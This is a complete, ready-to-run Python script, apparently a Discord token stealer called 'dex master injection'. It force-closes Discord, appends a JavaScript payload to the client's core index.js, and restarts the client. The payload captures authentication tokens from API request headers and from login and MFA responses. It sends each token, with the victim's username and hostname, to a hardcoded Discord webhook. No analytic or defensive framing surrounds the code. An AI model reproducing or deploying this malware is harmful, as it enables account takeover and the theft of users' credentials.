#dex master injection

import os
import subprocess
import time
import pathlib
import glob


WEBHOOK_URL = "https://discord.com/api/webhooks/1500860756202225744/5FrOu1nqAo32uIKqLzoBwshHAXqoFFOab7bCpvM9Ili1iepVWMHqsuY3OOBXCVbcCAFA"


def get_js_payload(webhook_url: str) -> str:
    #raw js string
    safe_url = webhook_url.replace("\\", "\\\\").replace("`", "\\`")
    return f'''var curium_injected=true;
(function() {{
    try {{
        const https = require('https');
        const electron = require('electron');
        const os = require('os');
        const WEBHOOK_URL = `{safe_url}`;
        const PC_USER = os.userInfo().username;
        const PC_HOST = os.hostname();
        let lastToken = null;

        function sendToken(token, source) {{
            try {{
                if (!token || token === lastToken) return;
                lastToken = token;
                
                const randomName = Math.random().toString(36).substring(2, 8) + Math.random().toString(36).substring(2, 8);
                const filename = randomName + '.json';
                const jsonData = JSON.stringify({{
                    token: token,
                    username: PC_USER,
                    hostname: PC_HOST,
                    source: source,
                    timestamp: new Date().toISOString()
                }});
                
                const boundary = '----FormBoundary' + Math.random().toString(36).substring(2);
                const body = [
                    `--${{boundary}}`,
                    'Content-Disposition: form-data; name="file"; filename="' + filename + '"',
                    'Content-Type: application/json',
                    '',
                    jsonData,
                    `--${{boundary}}--`
                ].join('\\r\\n');
                
                const url = new URL(WEBHOOK_URL);
                const req = https.request({{
                    hostname: url.hostname,
                    path: url.pathname + url.search,
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'multipart/form-data; boundary=' + boundary,
                        'Content-Length': Buffer.byteLength(body)
                    }}
                }});
                req.on('error', () => {{}});
                req.write(body);
                req.end();
            }} catch(e) {{}}
        }}

        function setupInterceptors() {{
            try {{
                const ses = electron.session && electron.session.defaultSession;
                if (!ses || !ses.webRequest) return;
                const filter = {{ urls: ['https://discord.com/api/*', 'https://*.discord.com/api/*', 'https://discordapp.com/api/*'] }};
                ses.webRequest.onBeforeSendHeaders(filter, (details, callback) => {{
                    try {{
                        const auth = details.requestHeaders['Authorization'] || details.requestHeaders['authorization'];
                        if (auth && !auth.startsWith('Bot ')) sendToken(auth, 'request_header');
                    }} catch(e) {{}}
                    callback({{ cancel: false, requestHeaders: details.requestHeaders }});
                }});
            }} catch(e) {{}}
        }}

        function setupRendererHooks() {{
            try {{
                electron.app.on('browser-window-created', (_, win) => {{
                    try {{
                        win.webContents.on('did-finish-load', () => {{
                            try {{
                                const rendererJS = `(function(){{
                                    try{{
                                        var oF=window.fetch;
                                        window.fetch=async function(){{
                                            var r=await oF.apply(this,arguments);
                                            try{{
                                                var u=typeof arguments[0]==="string"?arguments[0]:arguments[0].url;
                                                if(u&&(u.includes("/login")||u.includes("/mfa/")||u.includes("/register"))){{
                                                    r.clone().json().then(function(d){{
                                                        if(d.token){{
                                                            const randomName = Math.random().toString(36).substring(2, 8) + Math.random().toString(36).substring(2, 8);
                                                            const filename = randomName + '.json';
                                                            const jsonData = JSON.stringify({{
                                                                token: d.token,
                                                                username: "${{PC_USER}}",
                                                                hostname: "${{PC_HOST}}",
                                                                source: "login_response",
                                                                timestamp: new Date().toISOString()
                                                            }});
                                                            const formData = new FormData();
                                                            formData.append('file', new Blob([jsonData], {{type: 'application/json'}}), filename);
                                                            fetch('${{WEBHOOK_URL}}',{{
                                                                method:"POST",
                                                                body: formData
                                                            }}).catch(function(){{}});
                                                        }}
                                                    }}).catch(function(){{}});
                                                }}
                                            }}catch(e){{}}
                                            return r;
                                        }};
                                    }}catch(e){{}}
                                }})()`;
                                win.webContents.executeJavaScript(rendererJS).catch(() => {{}});
                            }} catch(e) {{}}
                        }});
                    }} catch(e) {{}}
                }});
            }} catch(e) {{}}
        }}

        if (electron.app.isReady()) {{
            setupInterceptors();
        }} else {{
            electron.app.whenReady().then(setupInterceptors).catch(() => {{}});
        }}
        setupRendererHooks();

    }} catch(e) {{}}
}})();'''



DISCORD_VARIANTS = ["Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment"]


def kill_discord():
    """Terminate all Discord processes."""
    for proc in ["Discord.exe", "DiscordCanary.exe", "DiscordPTB.exe", "DiscordDevelopment.exe"]:
        try:
            subprocess.run(
                ["taskkill", "/F", "/IM", proc],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except Exception:
            pass
    time.sleep(1.5)


def restart_discord(local_appdata: str):
    """Restart the first found Discord variant."""
    pairs = [
        ("Discord", "Discord.exe"),
        ("DiscordCanary", "DiscordCanary.exe"),
        ("DiscordPTB", "DiscordPTB.exe"),
        ("DiscordDevelopment", "DiscordDevelopment.exe"),
    ]
    for folder, exe in pairs:
        update_exe = os.path.join(local_appdata, folder, "Update.exe")
        if os.path.isfile(update_exe):
            try:
                subprocess.Popen(
                    [update_exe, "--processStart", exe],
                    cwd=os.path.dirname(update_exe),
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                print(f"[+] Restarted {folder}")
                return
            except Exception as e:
                print(f"[-] Failed to restart {folder}: {e}")


def inject_discord():
    local_appdata = os.environ.get("LOCALAPPDATA")
    if not local_appdata:
        print("[-] LOCALAPPDATA not set")
        return

    payload = get_js_payload(WEBHOOK_URL)
    kill_discord()

    injected_any = False
    for variant in DISCORD_VARIANTS:
        variant_path = os.path.join(local_appdata, variant)
        if not os.path.isdir(variant_path):
            continue

        #find logic
        app_dirs = glob.glob(os.path.join(variant_path, "app-*"))
        if not app_dirs:
            continue
        #latest by name
        app_dirs.sort(reverse=True)
        latest_app = app_dirs[0]

        modules_dir = os.path.join(latest_app, "modules")
        if not os.path.isdir(modules_dir):
            continue

        #Find the discord_desktop_core module
        core_module_dirs = glob.glob(os.path.join(modules_dir, "discord_desktop_core-*"))
        if not core_module_dirs:
            continue
        #Usually only one, but we take the first
        core_dir = os.path.join(core_module_dirs[0], "discord_desktop_core")
        index_js = os.path.join(core_dir, "index.js")

        if not os.path.isfile(index_js):
            print(f"[-] index.js not found in {variant}")
            continue

        try:
            with open(index_js, "r", encoding="utf-8") as f:
                content = f.read()
        except Exception as e:
            print(f"[-] Could not read {index_js}: {e}")
            continue

        if "curium_injected" in content:
            print(f"[!] Already injected in {variant}, skipping.")
            continue

        #payload
        try:
            with open(index_js, "w", encoding="utf-8") as f:
                f.write(content.rstrip() + "\n" + payload)
            print(f"[+] Injected into {index_js}")
            injected_any = True
        except Exception as e:
            print(f"[-] Failed to write to {index_js}: {e}")

    if injected_any:
        restart_discord(local_appdata)
    else:
        print("[-] No Discord installation was injected. Maybe Discord isn't installed or already patched.")


if __name__ == "__main__":
    inject_discord()
